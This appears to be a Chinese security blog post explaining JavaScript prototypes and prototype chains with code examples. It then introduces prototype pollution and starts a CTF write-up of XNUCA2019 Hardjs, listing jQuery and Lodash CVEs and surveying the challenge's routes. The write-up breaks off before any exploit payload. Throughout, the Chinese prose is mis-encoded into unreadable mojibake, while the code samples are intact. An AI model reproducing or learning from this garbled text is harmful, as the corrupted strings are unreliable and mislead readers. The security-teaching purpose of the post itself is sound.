<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="keyword">constructor</span>: Æ’ doSomething(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: Æ’ Object(),</span><br><span class="line">        hasOwnProperty: Æ’ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: Æ’ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: Æ’ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: Æ’ toLocaleString(),</span><br><span class="line">        toString: Æ’ toString(),</span><br><span class="line">        valueOf: Æ’ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>new</code>æ“ä½œç¬¦æ¥åˆ›å»ºåŸºäºè¿™ä¸ªåŸå‹å¯¹è±¡çš„doSomething<code>å®ä¾‹</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>; <span class="comment">// add a property onto the prototype</span></span><br><span class="line"><span class="keyword">var</span> doSomeInstancing = <span class="keyword">new</span> doSomething();</span><br><span class="line">doSomeInstancing.prop = <span class="string">&quot;some value&quot;</span>; <span class="comment">// add a property onto the object</span></span><br><span class="line"><span class="built_in">console</span>.log( doSomeInstancing );</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    prop: <span class="string">&quot;some value&quot;</span>,</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">        <span class="keyword">constructor</span>: Æ’ doSomething(),</span><br><span class="line">        __proto__: &#123;</span><br><span class="line">            <span class="keyword">constructor</span>: Æ’ Object(),</span><br><span class="line">            hasOwnProperty: Æ’ hasOwnProperty(),</span><br><span class="line">            isPrototypeOf: Æ’ isPrototypeOf(),</span><br><span class="line">            propertyIsEnumerable: Æ’ propertyIsEnumerable(),</span><br><span class="line">            toLocaleString: Æ’ toLocaleString(),</span><br><span class="line">            toString: Æ’ toString(),</span><br><span class="line">            valueOf: Æ’ valueOf()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå±æ€§ä¸å­˜åœ¨ <code>doSomeInstancing</code> çš„ <code>__proto__</code> çš„  <code>__proto__</code> ä¸­ï¼Œ é‚£ä¹ˆå°±ä¼šåœ¨<code>doSomeInstancing</code> çš„ <code>__proto__</code> çš„  <code>__proto__</code> çš„  <code>__proto__</code> ä¸­æŸ¥æ‰¾ã€‚ç„¶è€Œ, è¿™é‡Œå­˜åœ¨ä¸ªé—®é¢˜ï¼š<code>doSomeInstancing</code> çš„ <code>__proto__</code> çš„  <code>__proto__</code> çš„  <code>__proto__</code> å…¶å®ä¸å­˜åœ¨ã€‚å› æ­¤ï¼Œåªæœ‰è¿™æ ·ï¼Œåœ¨ <code>__proto__</code> çš„æ•´ä¸ªåŸå‹é“¾è¢«æŸ¥çœ‹ä¹‹åï¼Œè¿™é‡Œæ²¡æœ‰æ›´å¤šçš„ <code>__proto__</code> ï¼Œ æµè§ˆå™¨æ–­è¨€è¯¥å±æ€§ä¸å­˜åœ¨ï¼Œå¹¶ç»™å‡ºå±æ€§å€¼ä¸º <code>undefined</code> çš„ç»“è®ºã€‚</p>
<h3 id="åˆ›å»ºå¯¹è±¡å’Œç”ŸæˆåŸå‹é“¾"><a href="#åˆ›å»ºå¯¹è±¡å’Œç”ŸæˆåŸå‹é“¾" class="headerlink" title="åˆ›å»ºå¯¹è±¡å’Œç”ŸæˆåŸå‹é“¾"></a>åˆ›å»ºå¯¹è±¡å’Œç”ŸæˆåŸå‹é“¾</h3><p>ä½¿ç”¨è¯­æ³•ç»“æ„åˆ›å»ºå¯¹è±¡: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// o è¿™ä¸ªå¯¹è±¡ç»§æ‰¿äº† Object.prototype ä¸Šé¢çš„æ‰€æœ‰å±æ€§</span></span><br><span class="line"><span class="comment">// o è‡ªèº«æ²¡æœ‰åä¸º hasOwnProperty çš„å±æ€§</span></span><br><span class="line"><span class="comment">// hasOwnProperty æ˜¯ Object.prototype çš„å±æ€§</span></span><br><span class="line"><span class="comment">// å› æ­¤ o ç»§æ‰¿äº† Object.prototype çš„ hasOwnProperty</span></span><br><span class="line"><span class="comment">// Object.prototype çš„åŸå‹ä¸º null</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype </span></span><br><span class="line"><span class="comment">// (Array.prototype ä¸­åŒ…å« indexOf, forEach ç­‰æ–¹æ³•)</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype</span></span><br><span class="line"><span class="comment">// (Function.prototype ä¸­åŒ…å« call, bindç­‰æ–¹æ³•)</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ„é€ å™¨åˆ›å»ºå¯¹è±¡: </p>
<p>åœ¨ JavaScript ä¸­ï¼Œæ„é€ å™¨å…¶å®å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°ã€‚å½“ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">new æ“ä½œç¬¦</a> æ¥ä½œç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œå®ƒå°±å¯ä»¥è¢«ç§°ä¸ºæ„é€ æ–¹æ³•ï¼ˆæ„é€ å‡½æ•°ï¼‰ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Graph</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.vertices = [];</span><br><span class="line">  <span class="built_in">this</span>.edges = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Graph.prototype = &#123;</span><br><span class="line">  addVertex: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.vertices.push(v);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = <span class="keyword">new</span> Graph();</span><br><span class="line"><span class="comment">// g æ˜¯ç”Ÿæˆçš„å¯¹è±¡ï¼Œä»–çš„è‡ªèº«å±æ€§æœ‰ &#x27;vertices&#x27; å’Œ &#x27;edges&#x27;ã€‚</span></span><br><span class="line"><span class="comment">// åœ¨ g è¢«å®ä¾‹åŒ–æ—¶ï¼Œg.[[Prototype]] æŒ‡å‘äº† Graph.prototype</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>Object.create</code>åˆ›å»ºå¯¹è±¡</p>
<p>ECMAScript 5 ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°æ–¹æ³•ï¼š<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create"><code>Object.create()</code></a>ã€‚å¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ã€‚æ–°å¯¹è±¡çš„åŸå‹å°±æ˜¯è°ƒç”¨ create æ–¹æ³•æ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;; </span><br><span class="line"><span class="comment">// a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">Object</span>.create(a);</span><br><span class="line"><span class="comment">// b ---&gt; a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"><span class="built_in">console</span>.log(b.a); <span class="comment">// 1 (ç»§æ‰¿è€Œæ¥)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">Object</span>.create(b);</span><br><span class="line"><span class="comment">// c ---&gt; b ---&gt; a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// d ---&gt; null</span></span><br><span class="line"><span class="built_in">console</span>.log(d.hasOwnProperty); <span class="comment">// undefined, å› ä¸ºdæ²¡æœ‰ç»§æ‰¿Object.prototype</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>class</code> å…³é”®å­—åˆ›å»ºå¯¹è±¡: </p>
<p>ECMAScript6 å¼•å…¥äº†ä¸€å¥—æ–°çš„å…³é”®å­—ç”¨æ¥å®ç° <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes">class</a>ã€‚ä½¿ç”¨åŸºäºç±»è¯­è¨€çš„å¼€å‘äººå‘˜ä¼šå¯¹è¿™äº›ç»“æ„æ„Ÿåˆ°ç†Ÿæ‚‰ï¼Œä½†å®ƒä»¬æ˜¯ä¸åŒçš„ã€‚JavaScript ä»ç„¶åŸºäºåŸå‹ã€‚è¿™äº›æ–°çš„å…³é”®å­—åŒ…æ‹¬ <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/class"><code>class</code></a>, <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/constructor"><code>constructor</code></a>ï¼Œ<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/static"><code>static</code></a>ï¼Œ<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/extends"><code>extends</code></a> å’Œ <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(sideLength) &#123;</span><br><span class="line">    <span class="built_in">super</span>(sideLength, sideLength);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">set</span> <span class="title">sideLength</span>(<span class="params">newLength</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = newLength;</span><br><span class="line">    <span class="built_in">this</span>.width = newLength;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> square = <span class="keyword">new</span> Square(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p><code>hasOwnProperty</code> æ˜¯ JavaScript ä¸­å”¯ä¸€ä¸€ä¸ªå¤„ç†å±æ€§å¹¶ä¸”<strong>ä¸ä¼š</strong>éå†åŸå‹é“¾çš„æ–¹æ³•ã€‚</p>
<hr>
<p>ä¸‹é¢æ ¹æ®Smi1e å¸ˆå‚…çš„æ–‡ç« æ¥è¿‡ä¸€éåŸºç¡€çŸ¥è¯†</p>
<p>æ³¨: å‚è€ƒèµ„æ–™2</p>
<p>JavaScript æ˜¯ä¸€é—¨é¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œä½†æ˜¯åœ¨ ES6 ä¹‹å‰ï¼ŒJavaScript ä¸­æ²¡æœ‰ class è¯­æ³•ã€‚ä¸è¿‡åœ¨å®ƒçš„æ„é€ å‡½æ•°ï¼ˆ<code>constructor</code>ï¼‰å°±ç›¸å½“äºç±»ï¼Œé€šè¿‡æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆå®ä¾‹åŒ–çš„å¯¹è±¡ã€‚</p>
<p>çœ‹ä¸‹é¢çš„ä»£ç ç¤ºä¾‹å³å¯: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112310.png"></p>
<p>ä»æœ€åçš„ä»£ç å¯ä»¥çŸ¥é“: </p>
<blockquote>
<p><strong>å®ä¾‹å¯¹è±¡çš„ <code>__proto__</code>ä¸åˆ›å»ºè¯¥å®ä¾‹å¯¹è±¡çš„æ„é€ å‡½æ•°çš„ <code>prototype</code> æ˜¯ç›¸ç­‰çš„ã€‚</strong></p>
</blockquote>
<p>å›¾æ¥è‡ªå‚è€ƒèµ„æ–™2: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112511.png"></p>
<p>æ¯ä¸ªåŸå‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <strong>constructor å±æ€§ï¼ŒæŒ‡å‘ç›¸å…³è”çš„æ„é€ å‡½æ•°</strong>ï¼Œæ‰€ä»¥æ„é€ å‡½æ•°å’Œæ„é€ å‡½æ•°çš„ prototype æ˜¯å¯ä»¥ç›¸äº’æŒ‡å‘çš„ã€‚å®ä¾‹å¯¹è±¡ä¹Ÿå¯ä»¥è®¿é—®constructor å±æ€§æŒ‡å‘å…¶æ„é€ å‡½æ•°ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112825.png"></p>
<p>åŸå‹é“¾: åœ¨JavaScript ä¸­, å¦‚æœè®¿é—®æŸä¸ªå±æ€§,é¦–å…ˆä¼šåœ¨å®ä¾‹å¯¹è±¡çš„å†…éƒ¨å¯»æ‰¾, å¦‚æœæ²¡æ‰¾åˆ°, å°±åœ¨è¯¥å¯¹è±¡çš„åŸå‹<code>cat.__proto__</code> å³ <code>Cat.prototype</code> ä¸Šæ‰¾, å¯¹è±¡çš„åŸå‹ä¹Ÿæ˜¯å¯¹è±¡, ä¹Ÿæœ‰åŸå‹, å¦‚æœåœ¨å¯¹è±¡çš„åŸå‹ä¸Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç›®æ ‡å±æ€§,åˆ™ä¼šåœ¨å¯¹è±¡çš„åŸå‹çš„åŸå‹<code>Cat.prototype.__proto__</code> ä¸Šå¯»æ‰¾, ä¾æ¬¡å†…æ¨, <strong>ç›´åˆ°æ‰¾åˆ°äº†è¿™ä¸ªå±æ€§æˆ–è€…åˆ°è¾¾äº†æœ€é¡¶å±‚.</strong></p>
<p>å®ä¾‹å¯¹è±¡åŸå‹çš„åŸå‹æ˜¯<code>Object.prototype</code>ï¼Œè€Œå®ƒçš„åŸå‹æ˜¯nullï¼Œnull æ²¡æœ‰åŸå‹ï¼Œæ‰€ä»¥ <code>Object.prototype</code> å°±æ˜¯åŸå‹é“¾çš„æœ€é¡¶ç«¯ã€‚</p>
<p>åœ¨åŸå‹ä¸Šä¸€å±‚ä¸€å±‚æ‰¾, è¿™å°±æ˜¯åŸå‹é“¾.</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415113203.png"></p>
<h1 id="0x01-åŸå‹é“¾æ±¡æŸ“æ”»å‡»"><a href="#0x01-åŸå‹é“¾æ±¡æŸ“æ”»å‡»" class="headerlink" title="0x01 åŸå‹é“¾æ±¡æŸ“æ”»å‡»"></a>0x01 åŸå‹é“¾æ±¡æŸ“æ”»å‡»</h1><p>ç»ˆäºæˆ‘ä»¬æ¥åˆ°äº†ç¬”è®°çš„æ­£æ–‡âœ–, å…¶å®åŸºç¡€çŸ¥è¯†æ›´é‡è¦ âœ”</p>
<p>åœ¨JavaScriptä¸­è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å¯ä»¥ç”¨<code>a.b.c</code>æˆ–è€…<code>a[&quot;b&quot;][&quot;c&quot;]</code>æ¥è®¿é—®ã€‚ç”±äºå¯¹è±¡æ˜¯æ— åºçš„,å½“ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼è®¿é—®å¯¹è±¡æ—¶,åªèƒ½ä½¿ç”¨æŒ‡æ˜ä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>a[&quot;__proto__&quot;]</code>çš„æ–¹å¼å»è®¿é—®å…¶åŸå‹å¯¹è±¡ã€‚</p>
<p>åœ¨Javascriptä¸­å¯ä»¥é€šè¿‡<code>example.a.b</code>æˆ–<code>example.a[&quot;b&quot;]</code>æ¥å¯¹æ•°ç»„è¿›è¡Œè®¿é—®,<code>example.a</code>è®¿é—®çš„æ˜¯<code>example</code>å¯¹è±¡ä¸‹çš„<code>a</code>å¯¹è±¡çš„<code>b</code>,è€Œ<code>example.a[&quot;b&quot;]</code>åˆ™æ˜¯è®¿é—®<code>example</code>å¯¹è±¡ä¸‹çš„<code>a</code>æ•°ç»„çš„ä¸‹æ ‡ä¸º<code>b</code>çš„å€¼ã€‚</p>
<p>ç”±äºå¯¹è±¡æ˜¯æ— åºçš„,å½“ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼è®¿é—®å¯¹è±¡æ—¶,åªèƒ½ä½¿ç”¨æŒ‡æ˜ä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>a[&quot;__proto__&quot;]</code>çš„æ–¹å¼å»è®¿é—®å…¶åŸå‹å¯¹è±¡ã€‚</p>
<p><strong>åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</strong></p>
<h1 id="0x02-Hacking-in-CTF"><a href="#0x02-Hacking-in-CTF" class="headerlink" title="0x02    Hacking in CTF"></a>0x02    Hacking in CTF</h1><p>å‰é¢è¯´äº†é‚£ä¹ˆå¤šåŸºç¡€çŸ¥è¯†, é‡è¦çš„è¿˜æ˜¯å®é™…æ“ä½œ, <strong>know it then hack it !</strong></p>
<h2 id="XNUCA2019-Hardjs"><a href="#XNUCA2019-Hardjs" class="headerlink" title="XNUCA2019 Hardjs"></a>XNUCA2019 Hardjs</h2><ul>
<li><p>åŸå‹é“¾æ±¡æŸ“åˆ°RCE(å¤ªéš¾äº†â€¦å¤ç°çš„è¿‡ç¨‹å¾ˆåƒåŠ›â€¦æ‰¾ä¸åˆ°ç®€å•çš„é¢˜å‘€!)</p>
</li>
<li><p>æ­¤é¢˜å‰åç«¯éƒ½å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´</p>
</li>
<li><p>æœ‰å¤šç§Hacking æ–¹å¼, è¿™é‡Œæˆ‘é€‰æ‹©å…ˆçŸ¥ä¸Šçš„é‚£ç§æ–¹æ³•æ¥è¿›è¡Œå¤ç°â€¦ å¦å¤–çš„æ–¹æ³•éƒ½æœ‰èƒ½åŠ›äº†å†è¯´</p>
<ul>
<li>CVE-2019-11358 jQuery åŸå‹é“¾æ±¡æŸ“æ¼æ´ <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/201762.html">https://www.freebuf.com/vuls/201762.html</a> jQuery jQuery 3.4 Drupal Drupal 8.6.15 Drupal Drupal 8.5.15 Drupal Drupal  7.66 Backdrop Backdrop 1.12.6 Backdrop Backdrop 1.11.9                             </li>
<li>CVE-2019-10744 Lodash åº“åŸå‹é“¾æ±¡æŸ“æ¼æ´ <a target="_blank" rel="noopener" href="https://www.venustech.com.cn/article/1/9577.html">https://www.venustech.com.cn/article/1/9577.html</a> å½±å“èŒƒå›´ï¼š  4.17.11ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬</li>
</ul>
</li>
</ul>
<h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>é¢˜ç›®é¡µé¢é•¿è¿™æ ·, æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢,æ³¨å†Œä¸€ä¸ªadminè´¦å·,æ˜¾ç¤ºç”¨æˆ·åé‡å¤, <del>é‚£ä¹ˆå¾ˆæ˜æ˜¾åº”è¯¥æ˜¯è¦ä¼ªé€ èº«ä»½æˆä¸ºadminçš„æ ·äº†</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135304.png"></p>
<p>è¿›å»ä¹‹åæ˜¯è¿™æ ·</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135849.png"></p>
<p>æ‰“å¼€ç½‘ç»œæµ‹è¯•ä¸åŒçš„åŠŸèƒ½ç‚¹,å½“æˆ‘å‘è¡¨å†…å®¹æ—¶,å‘å‡ºçš„è¯·æ±‚, æ˜¯JSONæ ¼å¼çš„ , æ—¢ç„¶æ˜¯jsæ¼æ´é—®é¢˜, é‚£ä¹ˆå°±çœ‹çœ‹jsæ–‡ä»¶</p>
<p>è¿™é¢˜åœ¨buuä¸Šåªæœ‰ è¿™å‡ ä¸ªjsæ–‡ä»¶, å‡ ä¸ªé‡è¦çš„jsæ–‡ä»¶åœ¨GitHubä¸Šçœ‹å§. åŸæ¥è¿™é“é¢˜æ˜¯ç»™äº†é™„ä»¶çš„, é‚£ä¹ˆå°±æŠŠæºç ä¸‹ä¸‹æ¥å§</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415145752.png"></p>
<p>ç›®å½•ä¸­<code>server.js</code> å’Œ<code>robot.py</code> ä¼°è®¡æ˜¯é‡ç‚¹å®¡è®¡å¯¹è±¡, å¹²å°±å®Œäº†</p>
<p>åœ¨<code>robot.py</code> ä¸­, å¦‚å›¾æ‰€ç¤º, flag æ˜¯è¢«å®šä¹‰åœ¨äº†ç¯å¢ƒå˜é‡ä¸­å¹¶ä¸”æ˜¯adminçš„å¯†ç , <del>å¦‚æœä»¥adminçš„è´¦å·ç™»å½•,é‚£ä¹ˆå°±å¯èƒ½å¾—åˆ°flag, ç°åœ¨å°±æ˜¯å¦‚ä½•å»æ‰¾åˆ°æ¼æ´ç‚¹, è¿›è¡Œèº«ä»½ä¼ªé€ </del></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415155932.png"></p>
<p>å®åœ¨æ˜¯æ²¡å•¥å…·ä½“æ€è·¯, åªæœ‰éšéšçº¦çº¦é‚£ä¹ˆä¸€ç‚¹å„¿å‘³é“. è¿˜æ˜¯çœ‹wpå¤ç°å§.TTTTTTTCCCCCCL</p>
<p>åœ¨<code>server.js</code> ä¸­å¯ä»¥çœ‹åˆ°è·¯ç”±: </p>
<ul>
<li>/ ä¸»é¡µ</li>
<li>/static é™æ€æ–‡ä»¶</li>
<li>/sandbox å±•ç¤ºç”¨æˆ·HTML æ•°æ®ç”¨çš„æ²™ç›’</li>
<li>/login ç™»é™†</li>
<li>/register æ³¨å†Œ</li>
<li>/get json æ¥å£ è·å–æ•°æ®åº“ä¸­ä¿å­˜çš„æ•°æ®</li>
<li>/add ç”¨æˆ·æ·»åŠ æ•°æ®çš„å€Ÿå£</li>
</ul>
<p>é™¤äº†<code>/static</code>ï¼Œ<code>/login</code>å’Œ<code>/register</code>ä»¥å¤–ï¼Œæ‰€ä»¥è·¯ç”±åœ¨è®¿é—®çš„æ—¶å€™éƒ½ä¼šç»è¿‡ä¸€ä¸ª<code>auth</code>å‡½æ•°è¿›è¡Œèº«ä»½éªŒè¯</p>
<p>å› ä¸ºåšäº†è½¬ä¹‰å¤„ç†ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æ²¡æœ‰Sqlæ³¨å…¥çš„é—®é¢˜ï¼Œéœ€è¦ä»å…¶ä»–æ–¹é¢ä¸‹æ‰‹</p>
<p>ä»åˆå§‹åŒ–çš„åœ°æ–¹æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415165256.png"></p>
